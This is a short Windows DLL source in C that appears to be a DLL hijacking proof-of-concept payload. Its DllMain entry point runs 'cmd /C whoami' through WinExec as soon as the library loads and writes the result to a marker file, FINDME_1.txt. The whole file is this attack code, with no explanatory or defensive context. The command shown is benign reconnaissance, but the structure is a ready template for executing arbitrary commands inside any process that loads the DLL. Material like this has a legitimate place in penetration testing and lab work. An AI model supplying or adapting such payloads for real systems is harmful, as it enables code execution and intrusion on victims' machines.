#include <windows.h>
int execCommand()
{
 WinExec("cmd /C whoami > .\\FINDME_1.txt", 1);
 return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 execCommand();
 return 0;
}
